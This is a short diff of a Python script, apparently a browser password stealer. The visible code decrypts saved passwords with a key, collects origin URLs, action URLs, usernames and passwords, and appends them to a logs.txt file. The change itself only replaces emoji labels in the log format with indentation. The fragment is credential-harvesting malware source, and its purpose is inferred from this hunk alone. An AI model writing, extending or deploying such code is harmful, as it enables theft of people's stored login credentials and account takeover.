@@ -104,10 +104,10 @@ def write_key():
             password = decrypt_password(row[3], key)
             if username or password:
                 logs = f"""
-🤖 Origin URL: {origin_url}
-🤖 Action URL: {action_url}
-💥 Username: {username}
-💥 Password: {password}
+                Origin URL: {origin_url}
+                Action URL: {action_url}
+                Username: {username}
+                Password: {password}
                             """
                 with codecs.open("logs.txt", "a+", encoding="utf-8") as log_file:
                     log_file.write(str(logs))
